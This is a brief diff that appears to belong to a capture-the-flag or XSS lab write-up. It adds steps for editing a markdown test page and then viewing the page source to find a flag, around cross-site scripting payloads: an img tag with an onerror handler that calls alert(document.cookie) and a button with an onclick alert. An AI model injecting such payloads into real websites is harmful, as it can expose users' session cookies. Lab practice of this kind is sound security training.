@@ -1,3 +1,5 @@
+Go to Markdown Test Page -> Edit ->
+
 <button>some r</button>
 <img src="x onerrror=alert(document.cookie) />
 
@@ -7,3 +9,5 @@ Title
 tests
 
 <button onclick=alert()>XSS Button</button>
+
+Right Click -> View Page Source -> Flag
